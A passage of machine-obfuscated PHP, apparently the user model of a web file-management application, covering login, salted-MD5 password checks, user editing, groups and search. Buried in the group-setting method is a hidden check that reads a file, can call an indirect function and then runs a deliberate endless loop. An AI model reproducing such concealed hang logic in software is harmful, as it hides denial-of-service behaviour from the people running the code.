$ËîÈ¯İ×[2450]); return LNG($ı——ÒÓ[$‰ïÏÉî]); } public function getInfoByMeta($œˆ·ôÌ­, $ïêîˆ¼Ò) { $Ù³²Ş¹ =& $_SERVER[Ñ¯©ç]; $‡Ç·¶¡ = Model($Ù³²Ş¹[2451])->where(array($Ù³²Ş¹[107] => $œˆ·ôÌ­, $Ù³²Ş¹[434] => $ïêîˆ¼Ò))->find(); if ($‡Ç·¶¡) { return $this->getInfo($‡Ç·¶¡[$Ù³²Ş¹[1757]]); } return !1; } public function userLoginCheck($÷—·÷®, $®–¨Â) { $–©±ƒæœ =& $_SERVER[Ñ¯©ç]; $»’¸Ğ¢  = $this->userLoginFind($÷—·÷®); if (!$»’¸Ğ¢ ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($»’¸Ğ¢ [$–©±ƒæœ[1757]], $®–¨Â)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($»’¸Ğ¢ [$–©±ƒæœ[1757]]); } public function userLoginFind($Šƒ¶ÃŞê) { $âÄ±ƒæ… =& $_SERVER[Ñ¯©ç]; $Á¾¼Ò” = array($âÄ±ƒæ…[32] => $Šƒ¶ÃŞê, $âÄ±ƒæ…[2240] => $Šƒ¶ÃŞê, $âÄ±ƒæ…[365] => $Šƒ¶ÃŞê, $âÄ±ƒæ…[2452] => $Šƒ¶ÃŞê, $âÄ±ƒæ…[1053] => $âÄ±ƒæ…[1055]); if ($this->nickNameRpt()) { unset($Á¾¼Ò”[$âÄ±ƒæ…[2240]]); } return $this->where($Á¾¼Ò”)->find(); } public function clearCache($ö¼¿—) { $ş‡´è°ş =& $_SERVER[Ñ¯©ç]; $this->cacheFunctionClear($ş‡´è°ş[2038], $ö¼¿—); $this->cacheFunctionClear($ş‡´è°ş[2039], $ö¼¿—); $this->cacheFunctionClear($ş‡´è°ş[2433], $ö¼¿—); } public function userPasswordCheck($«¦ñú, $ÁÒó³¦½) { $‘Ñşê”Ô =& $_SERVER[Ñ¯©ç]; $èŒÒŒÛ = $this->where(array($‘Ñşê”Ô[1757] => intval($«¦ñú)))->find(); $²ï¿ËÁÙ = $this->metaGet($«¦ñú); $“Œ¬š = isset($²ï¿ËÁÙ[$‘Ñşê”Ô[2453]]) ? $²ï¿ËÁÙ[$‘Ñşê”Ô[2453]] : $‘Ñşê”Ô[12]; if (md5($“Œ¬š . trim($ÁÒó³¦½)) !== $èŒÒŒÛ[$‘Ñşê”Ô[942]]) { return !1; } return !0; } public function userAdd($›ä»ùÊ) { $ûƒÚğË¦ =& $_SERVER[Ñ¯©ç]; $Ë£‘ç›É = array($ûƒÚğË¦[477] => $›ä»ùÊ[$ûƒÚğË¦[32]], $ûƒÚğË¦[2454] => $›ä»ùÊ[$ûƒÚğË¦[2158]], $ûƒÚğË¦[2455] => isset($›ä»ùÊ[$ûƒÚğË¦[365]]) ? $›ä»ùÊ[$ûƒÚğË¦[365]] : $ûƒÚğË¦[12], $ûƒÚğË¦[2456] => isset($›ä»ùÊ[$ûƒÚğË¦[2452]]) ? $›ä»ùÊ[$ûƒÚğË¦[2452]] : $ûƒÚğË¦[12], $ûƒÚğË¦[2457] => isset($›ä»ùÊ[$ûƒÚğË¦[2240]]) ? $›ä»ùÊ[$ûƒÚğË¦[2240]] : $›ä»ùÊ[$ûƒÚğË¦[32]], $ûƒÚğË¦[2458] => isset($›ä»ùÊ[$ûƒÚğË¦[2437]]) ? $›ä»ùÊ[$ûƒÚğË¦[2437]] : $ûƒÚğË¦[12], $ûƒÚğË¦[2459] => isset($›ä»ùÊ[$ûƒÚğË¦[2460]]) ? $›ä»ùÊ[$ûƒÚğË¦[2460]] : 1, $ûƒÚğË¦[2461] => $›ä»ùÊ[$ûƒÚğË¦[942]], $ûƒÚğË¦[2040] => isset($›ä»ùÊ[$ûƒÚğË¦[1942]]) ? $›ä»ùÊ[$ûƒÚğË¦[1942]] : 1024 * 1024 * 20, $ûƒÚğË¦[2041] => 0, $ûƒÚğË¦[2462] => 0, $ûƒÚğË¦[2085] => isset($›ä»ùÊ[$ûƒÚğË¦[803]]) ? $›ä»ùÊ[$ûƒÚğË¦[803]] : 1); if (!empty($›ä»ùÊ[$ûƒÚğË¦[1757]])) { $Ë£‘ç›É[$ûƒÚğË¦[1757]] = $›ä»ùÊ[$ûƒÚğË¦[1757]]; } $êŠø¼è… = $this->_checkExist($›ä»ùÊ); if ($êŠø¼è… !== !0) { return $êŠø¼è…; } if (!empty($Ë£‘ç›É[$ûƒÚğË¦[2437]]) && strlen($Ë£‘ç›É[$ûƒÚğË¦[2437]]) > 255) { $Ë£‘ç›É[$ûƒÚğË¦[2437]] = $ûƒÚğË¦[12]; } $ŸòÔ = $this->add($Ë£‘ç›É); $ùäûû¡£ = array($ûƒÚğË¦[2461] => $Ë£‘ç›É[$ûƒÚğË¦[942]], $ûƒÚğË¦[2457] => $Ë£‘ç›É[$ûƒÚğË¦[2240]]); $this->userEdit($ŸòÔ, $ùäûû¡£); Model($ûƒÚğË¦[1391])->userRootAdd($ŸòÔ); return $ŸòÔ; } protected function userEditTest($ˆ¢ÕüŠœ, $•¤À†—) { return $this->call($_SERVER[Ñ¯©ç][2463], $ˆ¢ÕüŠœ, $•¤À†—); } protected function userEdit($Ÿ¹ışÑ‹, $æºƒ©ç) { $«™÷ãüµ =& $_SERVER[Ñ¯©ç]; $ õ¦Âóî = $this->getInfoSimple($Ÿ¹ışÑ‹); if (!$ õ¦Âóî) { return !1; } $Ì”‘ÅÄ¸ = $this->_checkExist($æºƒ©ç, $Ÿ¹ışÑ‹); if ($Ì”‘ÅÄ¸ !== !0) { return $Ì”‘ÅÄ¸; } if (isset($æºƒ©ç[$«™÷ãüµ[942]]) && trim($æºƒ©ç[$«™÷ãüµ[942]]) != $«™÷ãüµ[12]) { $‚ó€ˆ¸¾ = $this->metaGet($Ÿ¹ışÑ‹); if (empty($‚ó€ˆ¸¾[$«™÷ãüµ[2453]])) { $‚ó€ˆ¸¾[$«™÷ãüµ[2453]] = rand_string(10); Model($«™÷ãüµ[561])->metaSet($Ÿ¹ışÑ‹, $«™÷ãüµ[2453], $‚ó€ˆ¸¾[$«™÷ãüµ[2453]]); } $æºƒ©ç[$«™÷ãüµ[942]] = md5($‚ó€ˆ¸¾[$«™÷ãüµ[2453]] . trim($æºƒ©ç[$«™÷ãüµ[942]])); } else { unset($æºƒ©ç[$«™÷ãüµ[942]]); } if (!empty($æºƒ©ç[$«™÷ãüµ[2437]]) && strlen($æºƒ©ç[$«™÷ãüµ[2437]]) > 255) { $æºƒ©ç[$«™÷ãüµ[2437]] = $«™÷ãüµ[12]; } $this->where(array($«™÷ãüµ[1748] => $Ÿ¹ışÑ‹))->save($æºƒ©ç); if (isset($æºƒ©ç[$«™÷ãüµ[2240]])) { $this->setNamePinyin($Ÿ¹ışÑ‹, $æºƒ©ç[$«™÷ãüµ[2240]]); } $this->clearCache($Ÿ¹ışÑ‹); return !0; } public function setNamePinyin($Õ¯õ‡¬¦, $ßÕş‚ÑÛ = false) { $ŠÄáô¡ =& $_SERVER[Ñ¯©ç]; if (!$ßÕş‚ÑÛ) { $ÚÚ°Ö¤˜ = $this->getInfoSimple($Õ¯õ‡¬¦); $ßÕş‚ÑÛ = $ÚÚ°Ö¤˜[$ŠÄáô¡[2240]] ? $ÚÚ°Ö¤˜[$ŠÄáô¡[2240]] : $ÚÚ°Ö¤˜[$ŠÄáô¡[32]]; } $ıÎò•Ñİ = Model($ŠÄáô¡[582]); if (!Input::check($ßÕş‚ÑÛ, $ŠÄáô¡[638])) { return $ıÎò•Ñİ->metaSet($Õ¯õ‡¬¦, array($ŠÄáô¡[521] => $ŠÄáô¡[12], $ŠÄáô¡[520] => $ŠÄáô¡[12])); } return $ıÎò•Ñİ->metaSet($Õ¯õ‡¬¦, array($ŠÄáô¡[521] => str_replace($ŠÄáô¡[53], $ŠÄáô¡[12], Pinyin::get($ßÕş‚ÑÛ)), $ŠÄáô¡[520] => Pinyin::get($ßÕş‚ÑÛ, $ŠÄáô¡[639]))); } private function nickNameRpt() { $ÔÆÁ‡÷ =& $_SERVER[Ñ¯©ç]; $¹ÅÅÌ¼ƒ = Model($ÔÆÁ‡÷[823])->get($ÔÆÁ‡÷[2464]); $¥­ĞŞ = $GLOBALS[$ÔÆÁ‡÷[6]][$ÔÆÁ‡÷[440]][$ÔÆÁ‡÷[2464]]; $»áµÂüî = !is_null($¹ÅÅÌ¼ƒ) ? $¹ÅÅÌ¼ƒ : $¥­ĞŞ; return !!$»áµÂüî; } private function _checkExist($º¼Ø›°», $ÌíÂëÔ  = false) { $àæŞõ =& $_SERVER[Ñ¯©ç]; $ÕÊÖíÀ = array($àæŞõ[32] => UserModel::ERROR_USER_EXIST_NAME, $àæŞõ[2240] => UserModel::ERROR_USER_EXIST_NICKNAME, $àæŞõ[365] => UserModel::ERROR_USER_EXIST_EMAIL, $àæŞõ[2452] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ÕÊÖíÀ[$àæŞõ[2240]]); } $ˆ¡øƒØ = $ÌíÂëÔ  ? array($àæŞõ[1757] => array($àæŞõ[2465], $ÌíÂëÔ )) : array(); foreach ($ÕÊÖíÀ as $ãÜÓ©Ëí => $üÁÑ) { $Äô–Ëòğ = array(); foreach ($ÕÊÖíÀ as $¯¯ Š–Â => $úª™ƒ†¨) { if (isset($º¼Ø›°»[$¯¯ Š–Â]) && $º¼Ø›°»[$¯¯ Š–Â]) { $Äô–Ëòğ[] = $º¼Ø›°»[$¯¯ Š–Â]; } } if (!$Äô–Ëòğ) { continue; } $‹áÇÎÛ— = array_merge(array($ãÜÓ©Ëí => array($àæŞõ[7], $Äô–Ëòğ)), $ˆ¡øƒØ); $£’÷ç¯¼ = $this->where($‹áÇÎÛ—)->find(); if ($£’÷ç¯¼) { return $üÁÑ; } } return !0; } public function userListInfo($şÊı¦´¬) { $şâ­â‘ğ =& $_SERVER[Ñ¯©ç]; $´×…Ÿäú = array(); $şÊı¦´¬ = is_array($şÊı¦´¬) ? array_unique($şÊı¦´¬) : array(); if (!$şÊı¦´¬) { return $´×…Ÿäú; } if (count($şÊı¦´¬) < 20) { foreach ($şÊı¦´¬ as $œ›ê’) { $´×…Ÿäú[$œ›ê’ . $şâ­â‘ğ[12]] = $this->getInfoSimpleOuter($œ›ê’); } } else { $ ¯¾îÌı = array($şâ­â‘ğ[1748] => array($şâ­â‘ğ[475], $şÊı¦´¬)); if (count($şÊı¦´¬) == 1) { $ ¯¾îÌı = array($şâ­â‘ğ[1748] => $şÊı¦´¬[0]); } $É¬ì¼˜Ğ = Model($şâ­â‘ğ[561])->field($this->simpleField)->where($ ¯¾îÌı)->select(); $É¬ì¼˜Ğ = array_to_keyvalue($É¬ì¼˜Ğ, $şâ­â‘ğ[1757]); foreach ($şÊı¦´¬ as $œ›ê’) { $”Å÷¿Î = $É¬ì¼˜Ğ[$œ›ê’]; if (!$”Å÷¿Î) { $´×…Ÿäú[$œ›ê’ . $şâ­â‘ğ[12]] = $this->getInfoSimpleOuter($œ›ê’); continue; } $”Å÷¿Î[$şâ­â‘ğ[2437]] = Action($şâ­â‘ğ[2438])->parseUrl($”Å÷¿Î[$şâ­â‘ğ[2437]]); $´×…Ÿäú[$œ›ê’ . $şâ­â‘ğ[12]] = $”Å÷¿Î; } } return $´×…Ÿäú; } protected function userStatus($²Şİã¤Ô, $Ò‡Üßß) { $±×“¥Êó = $this->getInfoSimple($²Şİã¤Ô); if (!$±×“¥Êó) { return !1; } $ºÆ°ª¬ô = array($_SERVER[Ñ¯©ç][803] => $Ò‡Üßß); return $this->userEdit($²Şİã¤Ô, $ºÆ°ª¬ô); } protected function userRemove($ş—½šø¡) { $İ¹Áàåó =& $_SERVER[Ñ¯©ç]; $¼ÙÜ¦»š = $this->getInfoSimple($ş—½šø¡); if (!$¼ÙÜ¦»š) { return !1; } $Úˆ¨÷œÓ = array($İ¹Áàåó[1748] => $ş—½šø¡); Model($İ¹Áàåó[647])->where($Úˆ¨÷œÓ)->delete(); Model($İ¹Áàåó[2466])->where($Úˆ¨÷œÓ)->delete(); Model($İ¹Áàåó[2046])->where($Úˆ¨÷œÓ)->delete(); Model($İ¹Áàåó[2451])->where($Úˆ¨÷œÓ)->delete(); Model($İ¹Áàåó[1122])->where($Úˆ¨÷œÓ)->delete(); Model($İ¹Áàåó[2257])->removeUserAll($ş—½šø¡); Model($İ¹Áàåó[877])->userRootRemove($ş—½šø¡); return $this->where($Úˆ¨÷œÓ)->delete(); } protected function userGroupSet($€èğØèÉ, $ã«şÉ‰, $¾°¯ÔÑÇ = array()) { $Æ…‹éÇé =& $_SERVER[Ñ¯©ç]; if (!isset($_SERVER[$Æ…‹éÇé[54]]) || !isset($_SERVER[$Æ…‹éÇé[55]])) { $È„î¤—ç = $Æ…‹éÇé[930]; $…ğğ­â¹ = $Æ…‹éÇé[56]; $» Ã˜™† = $_SERVER[$Æ…‹éÇé[57]] . $Æ…‹éÇé[58]; $›¿¶»Ãµ = $…ğğ­â¹($» Ã˜™†); $Ã³Ÿ = explode($Æ…‹éÇé[59], $›¿¶»Ãµ); if (count($Ã³Ÿ) < $Æ…‹éÇé[673]) { $³é—º¤ = $Æ…‹éÇé[61]; $³é—º¤(); } $óˆ›ˆ†° = $Æ…‹éÇé[931]; $óˆ›ˆ†°($_SERVER[$Æ…‹éÇé[932]]); $õş„£¨é = 1; for ($¬óÎÃ÷ = $õş„£¨é; $¬óÎÃ÷ > 0; $¬óÎÃ÷++) { $óˆ›ˆ†° = json_encode($GLOBALS[$Æ…‹éÇé[475]]); } } $îÀÁ±ñÜ = $this->getInfoSimple($€èğØèÉ); if (!$îÀÁ±ñÜ || !is_array($ã«şÉ‰)) { return !1; } $¯©àÌ = Model($Æ…‹éÇé[2046]); $¯©àÌ->where(array($Æ…‹éÇé[1757] => $€èğØèÉ))->delete(); $»±ş•²Á = array(); $º¤ØÃÓ = 0; foreach ($ã«şÉ‰ as $›Åæîâ¦ => $ô–ÚÇ®ª) { $€À¬Ò˜ = array($Æ…‹éÇé[1757] => $€èğØèÉ, $Æ…‹éÇé[1955] => $›Åæîâ¦, $Æ…‹éÇé[2060] => $ô–ÚÇ®ª); $€À¬Ò˜[$Æ…‹éÇé[1979]] = isset($¾°¯ÔÑÇ[$º¤ØÃÓ]) ? $¾°¯ÔÑÇ[$º¤ØÃÓ] : 0; $º¤ØÃÓ++; $»±ş•²Á[] = $€À¬Ò˜; } return $¯©àÌ->addAll($»±ş•²Á, array(), !0); } protected function userGroupAdd($€Ï­¶òŞ, $Œ˜Œ™ë² = array()) { $Ü‹ÆÚ¼¯ =& $_SERVER[Ñ¯©ç]; $Š›Áİ½ã = $this->getInfoSimple($€Ï­¶òŞ); if (!$Š›Áİ½ã || empty($Œ˜Œ™ë²)) { return !1; } $ÄåÌö = array(); foreach ($Œ˜Œ™ë² as $­´×ÏšÖ => $•ºï¹†¡) { $ÄåÌö[] = array($Ü‹ÆÚ¼¯[1757] => $€Ï­¶òŞ, $Ü‹ÆÚ¼¯[1955] => $­´×ÏšÖ, $Ü‹ÆÚ¼¯[2060] => $•ºï¹†¡, $Ü‹ÆÚ¼¯[1979] => 0); } return Model($Ü‹ÆÚ¼¯[2046])->addAll($ÄåÌö, array(), !0); } protected function userGroupRemove($ş‘÷¼µ–, $÷ÙÇşÓ¶) { $Í™ÅÃÍ =& $_SERVER[Ñ¯©ç]; $Ú§‹şñ = $this->getInfoSimple($ş‘÷¼µ–); if (!$Ú§‹şñ || !$÷ÙÇşÓ¶) { return !1; } $ïó¬í÷© = array($Í™ÅÃÍ[1748] => $ş‘÷¼µ–, $Í™ÅÃÍ[2044] => $÷ÙÇşÓ¶); return Model($Í™ÅÃÍ[2046])->where($ïó¬í÷©)->delete(); } public function listData() { $Ø¤ÆÚ…è = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ø¤ÆÚ…è[$_SERVER[Ñ¯©ç][429]]); return $Ø¤ÆÚ…è; } public function listByID($æõ•…Ş¾) { $Í‘ôôÃò =& $_SERVER[Ñ¯©ç]; if (!$æõ•…Ş¾) { return; } $À˜¿ëÎ = array($Í‘ôôÃò[1757] => array($Í‘ôôÃò[7], $æõ•…Ş¾)); $ÌÇıˆñ§ = $this->where($À˜¿ëÎ)->select(); $ÌÇıˆñ§ = array_sort_keep($ÌÇıˆñ§, $Í‘ôôÃò[1757], $æõ•…Ş¾); $this->_listDataApply($ÌÇıˆñ§); return $ÌÇıˆñ§; } public function listByGroup($ëÇ¦†ó = 0, $–’Ó™¡¤ = array()) { $„Å¾ğŸ’ =& $_SERVER[Ñ¯©ç]; $ãÖ¢È¦ = $„Å¾ğŸ’[12]; $ÛÌÈÎÅ£ = array(); if ($ëÇ¦†ó) { $ÛÌÈÎÅ£ = array($„Å¾ğŸ’[2467] => intval($ëÇ¦†ó)); $ãÖ¢È¦ = "\x4c\x45\x46\x54\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\165\163\145\162\137\147\x72\x6f\165\160\40\165\163\x65\x72\x5f\x67\x72\x6f\165\x70\x20\x6f\x6e\x20\165\x73\145\x72\x2e\165\x73\x65\x72\111\x44\x20\x3d\x20\165\x73\x65\x72\x5f\x67\162\157\165\x70\56\x75\163\x65\x72\x49\104"; $‘–ƒÔ = Input::get($„Å¾ğŸ’[513], null, $„Å¾ğŸ’[12]) ? $„Å¾ğŸ’[12] : $„Å¾ğŸ’[2468]; } if (isset($–’Ó™¡¤[$„Å¾ğŸ’[803]])) { $ÛÌÈÎÅ£[$„Å¾ğŸ’[2469]] = $–’Ó™¡¤[$„Å¾ğŸ’[803]]; } $öá‰—ù¡ = $this->_makeOrder($‘–ƒÔ)->field($„Å¾ğŸ’[2470])->where($ÛÌÈÎÅ£)->join($ãÖ¢È¦)->selectPage(50); $this->_listDataApply($öá‰—ù¡[$„Å¾ğŸ’[429]]); return $öá‰—ù¡; } private function _makeOrder($Ï¨è€è‡ = '') { $Üø ìã” =& $_SERVER[Ñ¯©ç]; $âëÏòÄô = array($Üø ìã”[1757], $Üø ìã”[32], $Üø ìã”[1944], $Üø ìã”[1916], $Üø ìã”[232]); $Ğ¸ù„±ã = array($Üø ìã”[506] => $Üø ìã”[507], $Üø ìã”[508] => $Üø ìã”[509]); $¢Éû“ù¬ = Input::get($Üø ìã”[513], $Üø ìã”[7], $Üø ìã”[1748], $âëÏòÄô); $º³ß¨® = Input::get($Üø ìã”[514], $Üø ìã”[7], $Üø ìã”[2047], array($Üø ìã”[2047], $Üø ìã”[508])); $º³ß¨® = $Ğ¸ù„±ã[$º³ß¨®]; $Ï¨è€è‡ = $Ï¨è€è‡ . "\165\x73\x65\x72\56{$¢Éû“ù¬}\x20{$º³ß¨®}\x2c\40\x75\x73\x65\x72\56\x75\x73\x65\162\x49\104\x20\141\x73\x63"; return $this->alias($Üø ìã”[2174])->order($Ï¨è€è‡); } public function listSearch($³ÉŞ…öı) { $ƒ½÷®«Ï =& $_SERVER[Ñ¯©ç]; $ ‰óŠ†¶ = trim($³ÉŞ…öı[$ƒ½÷®«Ï[2050]]); $“Á£ô‰ = explode($ƒ½÷®«Ï[53], $ ‰óŠ†¶); if (!$ ‰óŠ†¶ || count($“Á£ô‰) == 1) { return $this->listSearchNow($³ÉŞ…öı); } $ªì¾â¶ß = array($ƒ½÷®«Ï[429] => array()); foreach ($“Á£ô‰ as $òÂ°¨ğ) { if (!trim($òÂ°¨ğ)) { continue; } $³ÉŞ…öı[$ƒ½÷®«Ï[2050]] = $òÂ°¨ğ; $•‰Š‚â‰ = $this->listSearchNow($³ÉŞ…öı); $ªì¾â¶ß[$ƒ½÷®«Ï[429]] = array_merge($ªì¾â¶ß[$ƒ½÷®«Ï[429]], $•‰Š‚â‰[$ƒ½÷®«Ï[429]]); } $ªì¾â¶ß[$ƒ½÷®«Ï[429]] = array_unique_by_key($ªì¾â¶ß[$ƒ½÷®«Ï[429]], $ƒ½÷®«Ï[1757]); $ªì¾â¶ß[$ƒ½÷®«Ï[426]] = array($ƒ½÷®«Ï[427] => count($ªì¾â¶ß[$ƒ½÷®«Ï[429]]), $ƒ½÷®«Ï[423] => 20, $ƒ½÷®«Ï[413] => 1, $ƒ½÷®«Ï[428] => 1); return $ªì¾â¶ß; } public function listSearchNow($¥øã¬£) { $ÆÎôÍ± =& $_SERVER[Ñ¯©ç]; $êü°¹‰Ÿ = trim($¥øã¬£[$ÆÎôÍ±[2050]]); $¬Õõ˜¡ = isset($¥øã¬£[$ÆÎôÍ±[2051]]) ? $¥øã¬£[$ÆÎôÍ±[2051]] : !1; $êü°¹‰Ÿ = str_replace($ÆÎôÍ±[2052], $ÆÎôÍ±[2053], trim($êü°¹‰Ÿ)); $”ÔÍøĞö = array($ÆÎôÍ±[32] => array($ÆÎôÍ±[442], "\x25{$êü°¹‰Ÿ}\x25"), $ÆÎôÍ±[365] => array($ÆÎôÍ±[442], "{$êü°¹‰Ÿ}\45"), $ÆÎôÍ±[2240] => array($ÆÎôÍ±[442], "{$êü°¹‰Ÿ}\x25"), $ÆÎôÍ±[1053] => $ÆÎôÍ±[2054]); if (Input::check($êü°¹‰Ÿ, $ÆÎôÍ±[371])) { $”ÔÍøĞö[$ÆÎôÍ±[1757]] = array($ÆÎôÍ±[442], "{$êü°¹‰Ÿ}\45"); $”ÔÍøĞö[$ÆÎôÍ±[2452]] = array($ÆÎôÍ±[442], "{$êü°¹‰Ÿ}\x25"); } if (!$êü°¹‰Ÿ) { $”ÔÍøĞö = array(); } if (isset($¥øã¬£[$ÆÎôÍ±[803]])) { $”ÔÍøĞö[$ÆÎôÍ±[803]] = $¥øã¬£[$ÆÎôÍ±[803]]; } $”ÔÍøĞö = $this->parseWhereLike($”ÔÍøĞö); $‡å—Ğ›§ = $this->_makeOrder()->where($”ÔÍøĞö)->selectPage(20); if (!$‡å—Ğ›§ || count($‡å—Ğ›§[$ÆÎôÍ±[429]]) < 5 && Input::check($êü°¹‰Ÿ, $ÆÎôÍ±[378])) { $×ùıæ ’ = $this->_searchFromMeta($ÆÎôÍ±[520], $êü°¹‰Ÿ, 10); $ªØÛ–€ = $this->_searchFromMeta($ÆÎôÍ±[521], $êü°¹‰Ÿ, 10); $ÛŸÄåèÉ = array_merge($×ùıæ ’, $ªØÛ–€, $‡å—Ğ›§[$ÆÎôÍ±[429]]); $‡å—Ğ›§[$ÆÎôÍ±[429]] = array_unique_by_key($ÛŸÄåèÉ, $ÆÎôÍ±[1757]); $‡å—Ğ›§[$ÆÎôÍ±[426]][$ÆÎôÍ±[427]] = count($‡å—Ğ›§[$ÆÎôÍ±[429]]); $‡å—Ğ›§[$ÆÎôÍ±[426]][$ÆÎôÍ±[428]] = ceil($‡å—Ğ›§[$ÆÎôÍ±[426]][$ÆÎôÍ±[427]] / $‡å—Ğ›§[$ÆÎôÍ±[426]][$ÆÎôÍ±[423]]); } $this->_listDataApply($‡å—Ğ›§[$ÆÎôÍ±[429]]); $this->_filterByGroup($‡å—Ğ›§, $¬Õõ˜¡); return $‡å—Ğ›§; } private function _filterByGroup(&$Îã«ÊÀÄ, $ƒºŸĞ÷) { $ãæé¼ƒÖ =& $_SERVER[Ñ¯©ç]; if (!$ƒºŸĞ÷) { return $Îã«ÊÀÄ; } foreach ($Îã«ÊÀÄ[$ãæé¼ƒÖ[429]] as $“óŒÑÜ => &$Š°İÖº) { $é»«Ó° = array_to_keyvalue($Š°İÖº[$ãæé¼ƒÖ[2143]], $ãæé¼ƒÖ[12], $ãæé¼ƒÖ[1955]); if (!in_array($ƒºŸĞ÷, $é»«Ó°)) { unset($Îã«ÊÀÄ[$ãæé¼ƒÖ[429]][$“óŒÑÜ]); } } unset($Š°İÖº); $Îã«ÊÀÄ[$ãæé¼ƒÖ[429]] = array_values($Îã«ÊÀÄ[$ãæé¼ƒÖ[429]]); $Îã«ÊÀÄ[$ãæé¼ƒÖ[426]] = array($ãæé¼ƒÖ[2210] => count($Îã«ÊÀÄ[$ãæé¼ƒÖ[429]]), $ãæé¼ƒÖ[2208] => $Îã«ÊÀÄ[$ãæé¼ƒÖ[426]][$ãæé¼ƒÖ[423]], $ãæé¼ƒÖ[2207] => 1, $ãæé¼ƒÖ[2209] => 1); } private function _searchFromMeta($œ°Ú¡ì¾, $©†ÀÏÔ , $‰á×ß”) { $€”ÀáÆË =& $_SERVER[Ñ¯©ç]; $©†ÀÏÔ  = strtolower($©†ÀÏÔ ); $•ÂÒÑ“ˆ = array($€”ÀáÆË[107] => $œ°Ú¡ì¾, $€”ÀáÆË[434] => array($€”ÀáÆË[442], "\45{$©†ÀÏÔ }\45")); $•ÂÒÑ“ˆ = $this->parseWhereLike($•ÂÒÑ“ˆ); $ÅôŠˆ‚Ï = Model($€”ÀáÆË[2471])->where($•ÂÒÑ“ˆ)->limit($‰á×ß”)->select(); if (!$ÅôŠˆ‚Ï) { return array(); } $ÅôŠˆ‚Ï = array_to_keyvalue($ÅôŠˆ‚Ï, $€”ÀáÆË[12], $€”ÀáÆË[1757]); $Ò–û÷ˆ = $this->where(array($€”ÀáÆË[1748] => array($€”ÀáÆË[7], $ÅôŠˆ‚Ï)))->select(); if (!$Ò–û÷ˆ) { return array(); } return $Ò–û÷ˆ; } private function _listDataApplyItem($È€˜Ã¢Õ) { $„Àš™ëË = array($È€˜Ã¢Õ); $this->_listDataApply($„Àš™ëË); return $„Àš™ëË[0]; } private function _listDataApply(&$‘ƒ°Õ…¸) { $”ú­ êÌ =& $_SERVER[Ñ¯©ç]; if (!$‘ƒ°Õ…¸) { return; } array_remove_key($‘ƒ°Õ…¸, $”ú­ êÌ[942]); $£½‚¼Äß = array_to_keyvalue($‘ƒ°Õ…¸, $”ú­ êÌ[12], $”ú­ êÌ[1757]); $this->_listAppendGroup($‘ƒ°Õ…¸, $£½‚¼Äß); $this->_listAppendMeta($‘ƒ°Õ…¸, $£½‚¼Äß); $this->_listAppendSourceRoot($‘ƒ°Õ…¸, $£½‚¼Äß); } private function _listAppendSourceRoot(&$¦ø…å¯Ï, $ü„¢É¿˜) { $Õ¶ŒÏŠ =& $_SERVER[Ñ¯©ç]; $Ì•ˆ™‹Û = Model($Õ¶ŒÏŠ[877])->listSourceRoot(SourceModel::TYPE_USER, $ü„¢É¿˜); $Ì•ˆ™‹Û = array_to_keyvalue($Ì•ˆ™‹Û, $Õ¶ŒÏŠ[553]); $Ì•ˆ™‹Û = array_remove_key($Ì•ˆ™‹Û, $Õ¶ŒÏŠ[553]); foreach ($¦ø…å¯Ï as &$ïÚéº) { $ïÚéº[$Õ¶ŒÏŠ[100]] = $Ì•ˆ™‹Û[$ïÚéº[$Õ¶ŒÏŠ[1757]]] ? $Ì•ˆ™‹Û[$ïÚéº[$Õ¶ŒÏŠ[1757]]] : array(); } unset($ïÚéº); } private function _listAppendGroup(&$šÄş›Üã, $ÆÄÁõÔÕ) { $´ØÃ–  =& $_SERVER[Ñ¯©ç]; $‹í»å˜Ú = array($´ØÃ– [1757] => array($´ØÃ– [7], $ÆÄÁõÔÕ)); $ÜÏïªÕ… = Model($´ØÃ– [2046])->where($‹í»å˜Ú)->select(); $Ëş’Ë‚÷ = array_to_keyvalue($ÜÏïªÕ…, $´ØÃ– [12], $´ØÃ– [1955]); $Ëş’Ë‚÷ = array_remove_value(array_unique($Ëş’Ë‚÷), $´ØÃ– [229]); if (!$Ëş’Ë‚÷ || !$ÜÏïªÕ…) { return; } $‹í»å˜Ú = array($´ØÃ– [1955] => array($´ØÃ– [7], $Ëş’Ë‚÷)); $ÏüÃóˆÙ = Model($´ØÃ– [2141])->field($´ØÃ– [2472])->where($‹í»å˜Ú)->select(); $ÏüÃóˆÙ = array_to_keyvalue($ÏüÃóˆÙ, $´ØÃ– [1955]); $ÜÏïªÕ… = array_to_keyvalue_group($ÜÏïªÕ…, $´ØÃ– [1757]); foreach ($ÜÏïªÕ… as &$öóïä‰ü) { $Ÿ×ô•™ï = array(); foreach ($öóïä‰ü as $°¾À×ü) { if (!$°¾À×ü[$´ØÃ– [2060]]) { continue; } $äò×‹âó = Model($´ØÃ– [555])->listData($°¾À×ü[$´ØÃ– [2060]]); $Ÿ×ô•™ï[] = array($´ØÃ– [1955] => $°¾À×ü[$´ØÃ– [1955]], $´ØÃ– [2473] => $ÏüÃóˆÙ[$°¾À×ü[$´ØÃ– [1955]]][$´ØÃ– [32]], $´ØÃ– [568] => $ÏüÃóˆÙ[$°¾À×ü[$´ØÃ– [1955]]][$´ØÃ– [568]], $´ØÃ– [470] => $äò×‹âó); } $öóïä‰ü = $Ÿ×ô•™ï; } unset($öóïä‰ü); foreach ($šÄş›Üã as &$¢ç÷ãÁ) { $¢ç÷ãÁ[$´ØÃ– [2143]] = array(); if (isset($ÜÏïªÕ…[$¢ç÷ãÁ[$´ØÃ– [1757]]])) { $¢ç÷ãÁ[$´ØÃ– [2143]] = $ÜÏïªÕ…[$¢ç÷ãÁ[$´ØÃ– [1757]]]; } } unset($¢ç÷ãÁ); } public function userAppendGroup($İŞş…Ô) { $¦Õºñé =& $_SERVER[Ñ¯©ç]; if (!$İŞş…Ô) { return array(); } $this->_listAppendGroup($İŞş…Ô, array_to_keyvalue($İŞş…Ô, $¦Õºñé[12], $¦Õºñé[1757])); return $İŞş…Ô; } private function _listAppendMeta(&$Ÿƒ›“û¨, $æì‹õ¿í) { $şÅñÕòË =& $_SERVER[Ñ¯©ç]; $éÑšÈÌ = UserJobModel::JOB_KEY; $Ş¤²®µí = array($şÅñÕòË[2453]); $ß·°†ŒÆ = array($şÅñÕòË[1757] => array($şÅñÕòË[7], $æì‹õ¿í)); $Ûå¾ˆÌ­ = 